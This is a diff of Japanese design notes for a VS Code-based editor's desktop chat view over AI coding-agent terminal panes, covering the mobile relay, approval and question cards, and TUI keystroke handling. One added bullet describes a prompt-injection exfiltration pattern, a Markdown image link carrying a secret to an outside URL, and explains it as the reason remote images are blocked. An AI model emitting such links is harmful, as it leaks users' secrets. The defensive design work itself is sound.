@@ -889,7 +889,7 @@ TM3 / TM4 / TM7 / TM10 / TM21 はすべて `src/vs/paradis/contrib/` の新規�
 サブエージェント・最後の発言・未回答の質問・プロンプトキャッシュの残り時間は、モバイル中継（`mobileRelay/node/paradisMobileAgentChat.ts`）が transcript と hook から既に読んでいる。デスクトップの UI はこれを二重に集計せず、中継に**読み取り口だけ**を足して引く（hook を直接読む集計を別に作ると、PC とスマホで表示が食い違い、Codex のサブエージェントも取れないため）。モバイルへ送るメッセージの形は変えていない。
 
 - 口は `IParadisAgentPaneInsightSource`（`agentInsights/common/paradisAgentInsights.ts`）。中継サービスのチャネル `PARADIS_MOBILE_RELAY_CHANNEL` に `getAgentPaneInsights(tokens)` と `onDidChangeAgentPaneInsights` を足しただけ。renderer 側は `agentInsights/electron-browser` の取得係がこのウィンドウのペイントークン分だけ取り、`IParadisAgentInsightsService`（browser 層のストア）へ置く。知らせの取りこぼしに備えて 10 秒ごとにも取り直す
-- **モバイル連携が無効でも動く**。中継サービスは shared process で常に生成され、セッションが確定したペインの status 用 tailer はモバイル接続と無関係に常駐している（`stopTailerIfUnsubscribed` 参照）。ただしモバイル向けの質問・承認の注入（`injectLiveQuestions` / `injectApprovalRequest`）はペアリング済みのモバイルがあるときしか動かないので、デスクトップの「待っている内容」はそれに頼らず hook（`PreToolUse` の AskUserQuestion と `PermissionRequest`）から別に覚えている（`recordDesktopInteraction`）
+- **モバイル連携が無効でも動く**。中継サービスは shared process で常に生成され、セッションが確定したペインの status 用 tailer はモバイル接続と無関係に常駐している（`stopTailerIfUnsubscribed` 参照）。ただしモバイル向けの質問・承認の注入（`injectLiveQuestions` / `injectApprovalRequest`）はペアリング済みのモバイルがあるときしか動かない（フェーズ6 からはデスクトップのチャット表示のためにも入るが、`quiet` / `desktopOnly` の印付きで、ここの「待っている内容」には数えない。「デスクトップのチャット」の節を参照）ので、デスクトップの「待っている内容」はそれに頼らず hook（`PreToolUse` の AskUserQuestion と `PermissionRequest`）から別に覚えている（`recordDesktopInteraction`）
 - ProxyChannel はサービスのイベントをチャネル登録時に `Event.buffer` で購読してしまうため、「購読者がいる間だけ動かす」は効かない。変化の検出は hook・tailer の追記・活動ツリーの更新を契機に 250ms まとめて指紋を比べる方式にした
 - プロンプトキャッシュの残り時間は Claude の assistant 行の `usage.cache_creation.ephemeral_5m_input_tokens` / `ephemeral_1h_input_tokens` から決める（両方あれば先に切れる 5 分、読み込みだけのリクエストは直前の長さを引き継ぐ）。起点はその応答を求めたリクエストの時刻で、直前の user 行（ユーザーの発言か tool_result）の `timestamp` で近似する（応答を書き終えた時刻を使うと、生成に2分かかった応答で残りを2分長く見積もる）。エディタのターミナルのバッジは、応答中（状態が「動作中」）と 0 になった後は消す
 - **Codex は残り時間を出さない**。OpenAI のプロンプトキャッシュは「おおむね 5〜10 分の無操作で消え、長くても 1 時間」という目安しか公開されておらず、rollout の `token_count` にも `cached_input_tokens` しか無い（有効期限を決める根拠が記録に無い）
@@ -1121,22 +1121,28 @@ upstream のディクテーションは Foundry Local のネイティブ部品�
 
 ## デスクトップのチャット（agentChat、2026-09-27、フェーズ6）
 
-エディタエリアのターミナルタブを `⌘⇧J` で同じ会話のチャット表示に切り替える（C1、Q29〜Q32 すべて案A）。upstream のファイルは1行も触っていない。コードは `src/vs/paradis/contrib/agentChat/` にまとめ、モバイル中継とは次の3か所だけでつながる。
+エディタエリアのターミナルタブを `⌘⇧J`（Windows / Linux は `Ctrl+Shift+J`）で同じ会話のチャット表示に切り替える（C1、Q29〜Q32 すべて案A）。upstream のファイルは1行も触っていない。コードは `src/vs/paradis/contrib/agentChat/` にまとめ、モバイル中継とは次の表のところでつながる。
 
 | 部品 | 場所 | 中身 |
 |---|---|---|
-| 会話の型と transcript の正規化 | `agentChat/common/paradisAgentChat.ts`・`paradisAgentTranscriptParser.ts` | `paradisMobileAgentChat.ts` から切り出した（中身は変えていない）。中継は再公開しているので、既存のテストの import はそのまま |
-| デスクトップ向けの読み取り口 | `ParadisMobileAgentChat` の `watchDesktopChat` / `getDesktopChat` ほか | 中継のチャネル `PARADIS_MOBILE_RELAY_CHANNEL` に `IParadisAgentChatSource` として載る。モバイルへは何も送らない |
-| TUI への打鍵 | `agentChat/browser/paradisAgentTuiInput.ts`、`paradisAgentApprovalKeySequence` | モバイルの renderer 側（`paradisMobileWorkspaceProvider.ts`）から切り出した。質問のキー列・目印待ち・許可のキー列はモバイルと同じ関数を通る |
+| 会話の型と transcript の正規化 | `agentChat/common/paradisAgentChat.ts`・`paradisAgentTranscriptParser.ts`・`paradisAgentQuestionMarker.ts` | `paradisMobileAgentChat.ts` から切り出した（中身は変えていない）。中継は再公開しているので、既存のテストの import はそのまま |
+| デスクトップ向けの読み取り口 | `ParadisMobileAgentChat` の `watchDesktopChat` / `getDesktopChat` / `claimDesktopInteraction` ほか | 中継のチャネル `PARADIS_MOBILE_RELAY_CHANNEL` に `IParadisAgentChatSource` として載る。モバイルへは何も送らない |
+| TUI への打鍵（いつ・どう流すか） | `agentChat/browser/paradisAgentTuiInput.ts` | モバイルの renderer 側（`paradisMobileWorkspaceProvider.ts`）から切り出した。モバイルは `strict: false`（目印が無くても流す）、デスクトップは `strict: true` |
+| キー列（何を流すか） | `mobileRelay/common/paradisAgentQuestionKeys.ts`（`paradisAgentApprovalKeySequence` を含む） | 持ち主は mobileRelay のまま。モバイルアプリの写しとの突き合わせテスト（`app/mobile/src/agentQuestionKeysParity.test.ts`）がこのパスを直接 import しているので動かしていない |
+| 送る前の判断 | `agentChat/browser/paradisAgentChatInput.ts` | デスクトップの送信・回答の本体。ITerminalInstance を細い形（`IParadisAgentChatTerminal`）で受け、テストで差し替える |
 
-- **会話はモバイルと同じ tailer から引く**（Q29）。画面は差分（epoch + rev）で取り、中継は「見られているペインの指紋が変わった」ときだけトークンを知らせる（80ms でまとめる）。取りこぼしに備えて、表示中のチャットは 5 秒ごとに取り直す。tailer が持つのは直近 400 件だけなので、それより前は「省略しています」と出してターミナルへ案内する
-- **ウィンドウは自分のペインを 10 秒ごとに `watchAgentChat` で送り直す**（中継の期限は 30 秒）。見られているペインでは、モバイルとつないでいなくても AskUserQuestion と許可要求を hook から tailer へ入れる（Claude Code は質問を回答されるまで transcript に書かないため、入れないとカードを出せない）。**モバイル向けの注入が動いていない（リレー無効かペアリング無し）ときに入れたものは、以前の振る舞いを変えない印を付ける**。質問はモバイルへの通知を出さず（`injectLiveQuestions(..., quiet)`）、承認はペインの状態（許可待ちの表示、`hasPendingApproval`）とスペース一覧の「待っている内容」に数えない（`injectApprovalRequest(..., desktopOnly)`）。tool_use_id の無い承認は合成 id になってターン終了まで解けないので、数えると作業中のペインが「許可待ち」のまま残る
+- **会話はモバイルと同じ tailer から引く**（Q29）。画面は差分（epoch + rev）で取り、中継は「チャット表示中のペインの指紋が変わった」ときだけトークンを知らせる（80ms でまとめる）。取りこぼしに備えて、表示中のチャットは 5 秒ごとに取り直す。tailer が持つのは直近 400 件だけなので、それより前は「省略しています」と出してターミナルへ案内する
+- **ウィンドウは自分の全ペイン（チャットを開いていないものも含む）を 10 秒ごとに `watchAgentChat` で送り直す**（中継の期限は 30 秒）。開く前に出た質問もカードにできるよう、全ペインで AskUserQuestion と許可要求を hook から tailer へ入れる（Claude Code は質問を回答されるまで transcript に書かないため、入れないとカードを出せない）。**モバイル向けの注入が動いていない（リレー無効かペアリング無し）ときに入れたものは、以前の振る舞いを変えない印を付ける**。質問はモバイルへの通知を出さず（`injectLiveQuestions(..., quiet)`）、質問も承認もペインの状態（質問中・許可待ちの表示）とスペース一覧の「待っている内容」に数えない（`desktopOnlyQuestionIds` / `desktopOnlyApprovalId`）。モバイルが購読を始めるか注入が有効になったら印を外す（`promoteDesktopOnly`）
+- **「待っている内容」は agentInsights（hook から覚えた `desktopInteractions`）とチャット（tailer の `pendingQuestions` / `pendingApproval`）の2か所にある**。agentInsights は1行の要約だけを要し、モバイル未接続でも以前から hook だけで動いていた。チャットは選択肢と回答の突き合わせに tailer の状態が要る。1つにまとめるのは P3 の前に行う（出どころを tailer に寄せ、hook からの記憶は補助にする）。それまでは上の印で、片方にしか無いものがもう片方の表示を変えないようにしている
+- **tool_use_id の無い許可要求（合成 id `approval:`）は、同じツールの `PostToolUse` / `PostToolUseFailure` か次の `UserPromptSubmit` で解く**（`clearSyntheticApproval`、モバイルにも効く）。以前はターン終了まで残り、答えた後もカードが押せて `1`+Enter がエージェントへの発言として入っていた。ツール名の分からない hook では解かない。【要確認】Claude Code の PermissionRequest hook に tool_use_id が入るか
 - 重ねる先は共有ドットと同じ `paradisRegisterEditorTerminalOverlay`。チャットの間はコンテナに `paradis-agent-chat-active` を付けてターミナルの画面を `opacity: 0` にする（ウィンドウの透過で下の文字が透けないように）。`visibility: hidden` にすると xterm がフォーカスを受けられず、下のフォーカスの付け替えが働かない。z-index は 34（xterm と検索ウィジェットより上、共有ドットとキャッシュの残り時間の 35 より下）
-- **チャットの上の mousedown / mouseup / contextmenu は親へ流さない**。`TerminalEditor` はエディタ全体の mousedown でターミナルのクリック動作（右クリックの貼り付けなど）を行うため
-- `TerminalEditor` はタブを選ぶとターミナルへフォーカスを戻す。チャットの間は `instance.onDidFocus` で入力欄へ移し直す（打った文字がシェルへ流れないように）。`⌘⇧J` は `DEFAULT_COMMANDS_TO_SKIP_SHELL` へ起動時に追記している（terminalFontZoom と同じ）
-- 送る前に、質問・許可の確認を待っていないことを中継から取り直して確かめる（待っている TUI に文字を流すと先頭が選択肢として食われる）。質問・許可の回答は、各キーの直前に「まだ同じものを待っているか」を中継から取り直し、変わっていたら残りを送らない。打鍵の前にはモバイルと同じ `interactionClaims` を取り（`claimAgentChatInteraction`）、1つでも打鍵したら 60 秒（質問の決着・ターン終了まで）同じものへは打ち直させない。画面側も送り終えたカードは押せないままにし、この画面から答え終えた interaction は中継が消すのを待たずに文を送れるようにする。Codex の app-server 経由の承認（`codex:`）はキーではなく `answerAgentChatApproval` で返す
-- 既知の制約: Claude の許可は「許可」「拒否」だけ（「以後は確認しない」はキー列を実測していないので出していない）。チャット表示かどうかはウィンドウを再読み込みすると忘れる。SSH 接続先のペインではスラッシュコマンドの候補が出ない（手元の設定から作らないため）。P3（メッセージレール、計画、サブエージェント、タスク、Codex goal、区切り表示）は未実装
-- **【要確認】実機での確認はまだ**（CSS の見え方、IME、⌘⇧J がターミナルにフォーカスがあるときに効くか、質問への回答が TUI に入るか）
+- **チャットの上の mousedown / mouseup / contextmenu / drag 系は親へ流さない**。`TerminalEditor` はエディタ全体の mousedown でターミナルのクリック動作（右クリックの貼り付けなど）を行い、ターミナルはドロップされたファイルのパスを TUI へ入れるため。右クリックは自前のメニュー（入力欄の切り取り・コピー・貼り付け、選んだ本文のコピー）、ドロップはチャットの入力欄へパスを入れる
+- `TerminalEditor` はタブを選ぶとターミナルへフォーカスを戻す。チャットの間は `instance.onDidFocus` で入力欄へ移し直す（打った文字がシェルへ流れないように）。`⌘⇧J` は `DEFAULT_COMMANDS_TO_SKIP_SHELL` へ起動時に追記している（terminalFontZoom と同じ）。Windows / Linux ではエージェントのタブで `Ctrl+Shift+J` がシェルへ送られなくなる
+- **送る前に確かめること**（`ParadisAgentChatInput`）: エージェントが前面にいる（シェル統合でシェルのプロンプトが入力待ちなら送らない、`SessionEnd` を受けていたら送らない）、回答待ちでない、画面に回答待ちの文言（`paradisScreenShowsAgentPrompt`、【推測】Claude Code 2.1 系と Codex 0.14x の表示から取った文言）が無い、改行を含むなら貼り付けモードである。文の制御文字はフェーズ5のプリセットと同じ `paradisBuildPresetInsertText` で落とす。モバイルの `action/sendMessage` には同じ確認を入れていない（モバイルの振る舞いを変えないため。入れるならモバイル側の確認と合わせて行う）
+- **回答は、画面に目印が出たのを確かめてから打鍵する**。質問は選択肢のラベル（作れない質問には答えない）、承認は許可の確認の文言。5 秒待っても出なければ送らずに「ターミナルで答えてください」と返す。各キーの直前に「まだ同じものを待っているか」を中継から取り直し、変わっていたら残りを送らない。打鍵の前にはモバイルと同じ `interactionClaims` を取り（`claimAgentChatInteraction`）、1つでも打鍵したら 60 秒（質問の決着・ターン終了まで）同じものへは打ち直させない。承認を送り終えたら中継の `lastApprovalKey` を消し、同じ本文の再発火を新しい承認として受け付ける。この画面から答え終えた承認は、画面から確認の文言が消えていれば、中継が消すのを待たずに文を送れる（質問は対象にしない）。カードの状態はペインごとにコントローラが持つので、表示やタブを切り替えても消えない。Codex の app-server 経由の承認（`codex:`）はキーではなく `answerAgentChatApproval` で返す
+- 会話の Markdown は外部の画像を読み込まない（`remoteImageIsAllowed: () => false`、画像の書き方は `paradisAgentChatImagesToLinks` でリンクに書き換える）。プロンプトインジェクションで `![](https://.../?d=<秘密>)` を出力させると、チャットを開いただけで送られるため
+- 既知の制約: Claude の許可は「許可」「拒否」だけ（「以後は確認しない」はキー列を実測していないので出していない）。許可の「はい」のキー列 `1`+Enter で `1` が即確定かは未実測（即確定なら Enter が次の画面へ届く。モバイルと同じ列）。チャット表示かどうかはウィンドウを再読み込みすると忘れる。SSH 接続先のペインではスラッシュコマンドの候補が出ない（手元の設定から作らないため）。P3（メッセージレール、計画、サブエージェント、タスク、Codex goal、区切り表示）は未実装
+- **【要確認】実機での確認はまだ**（CSS の見え方、IME、⌘⇧J がターミナルにフォーカスがあるときに効くか、質問への回答が TUI に入るか、確認画面の文言の検出が効くか）
 
 ## HTML プレビューの読み取り範囲（2026-08-21、未解決の課題として記録）
 
